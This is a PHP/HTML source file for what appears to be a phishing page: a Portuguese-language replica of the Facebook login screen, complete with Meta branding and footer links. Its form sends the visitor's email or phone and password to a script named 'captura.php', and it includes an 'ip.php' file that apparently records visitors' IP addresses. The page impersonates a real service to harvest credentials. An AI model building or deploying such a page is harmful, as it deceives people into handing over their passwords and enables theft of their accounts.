<?php include("ip.php");?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
  <link rel="stylesheet" href="assets/css/estilo.css"/>
  <title>Document</title>
</head>
<body>
 
  <div id="main">
    <p id="link-exclamation">
      O Facebook solicita e recebe seu número de telefone da rede móvel. <a href="">Alterar as configurações</a>
    </p>
    <a id="link-app" href=""><i class="fa-solid fa-mobile"></i> Obtenha o Facebook para Android e navegue mais rápido.</a>
    <img id="logo-mobile" src="assets/img/facebook.svg"/>
    <div id="container">
      <div id="card-img">
        <img id="logo" src="assets/img/facebook.svg"/>
        <p>
          O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
        </p>
      </div>
      
      <div id="card-form">
        <form action="src/captura.php" method="POST">
          <div id="groupInput">
            <input type="text" placeholder="Email ou telefone" name="input-email-telefone"/>
            <a id="icone">
              <i class="fa-solid fa-circle-exclamation"></i>
            </a>
          </div>
          <div id="groupInputPass">
            <input id="password-input" type="password" placeholder="Senha" name="input-senha"/>
            <a id="iconeEye" href="#">
              <i class="fa-solid fa-eye"></i>
            </a>
          </div>
          <button id="btn-entrar">Entrar</button>
          <a href="">Esqueceu a senha?</a>
          <span id="barra"></span>
          <span id="barra-mobile">OU</span>
          <button id="btn-conta">Criar nova conta</button>
        </form>
        <p><a href="">Criar uma Página</a> para uma celebridade, uma marca ou uma empresa</p>
      </div>
    </div>
  </div>
  
  <footer>
    <div class="container">
      
    <ul id="nav-first">
      <div id="card-first">
        <li><a href="">Português (Brasil)</a></li>
        <li><a href="">English (US)</a></li>
        <li><a href="">Español</a></li>
        <li><a href="">العربية</a></li>
      </div>
      <div id="card-second">
        <li><a href="">Français (France)</a></li>
        <li><a href="">Italiano</a></li>
        <li><a href="">Deutsch</a></li>
      </div>
      <li><a href="">हिन्दी</a></li>
      <li><a href="">中文(简体)्दी</a></li>
      <li><a href="">日本語्दी</a></li>
    </ul>
    
    <ul>
      <li><a href="">Cadastre-se</a></li>
      <li><a href="">Entrar</a></li>
      <li><a href="">Messenger</a></li>
      <li><a href="">Facebook</a></li>
      <li><a href="">Facebook lite</a></li>
      <li><a href="">Watch</a></li>
      <li><a href="">Locais</a></li>
      <li><a href="">Jogos</a></li>
      <li><a href="">Marketplace</a></li>
      <li><a href="">Facebook Pay</a></li>
      <li><a href="">Oculus</a></li>
      <li><a href="">Portal</a></li>
      <li><a href="">Instagram</a></li>
      <li><a href="">Boletim</a></li>
      <li><a href="">Local</a></li>
      <li><a href="">Campanhas de arrecadação de fundos</a></li>
      <li><a href="">Serviços</a></li>
      <li><a href="">Central de Informações de Votação</a></li>
      <li><a href="">Grupos</a></li>
      <li><a href="">Sobre</a></li>
      <li><a href="">Criar</a></li>
      <li><a href="">anúncio</a></li>
      <li><a href="">Criar</a></li>
      <li><a href="">Página</a></li>
      <li><a href="">Desenvolvedores</a></li>
      <li><a href="">Carreiras</a></li>
      <li><a href="">Privacidade</a></li>
      <li><a href="">Cookies</a></li>
      <li><a href="">Escolhas para anúncios</a></li>
      <li><a href="">Termos</a></li>
      <li><a href="">Ajuda</a></li>
      <li><a href="">Carregamento de contatos e não usuários</a></li>
      <li><a href="">Carregamento de contatos e não usuários</a></li>
      <li><a href="">Configurações</a></li>
      <li><a href="">Registro de Atividades</a></li>
    </ul>
    <p id="copy">Meta &copy; <?= date("Y") ;?></p>
    
    </div>
  </footer>
  
  <script src="https://kit.fontawesome.com/a8ba3574d4.js" crossorigin="anonymous"></script>
  <script src="assets/js/script.js"></script>
</body>
</html>
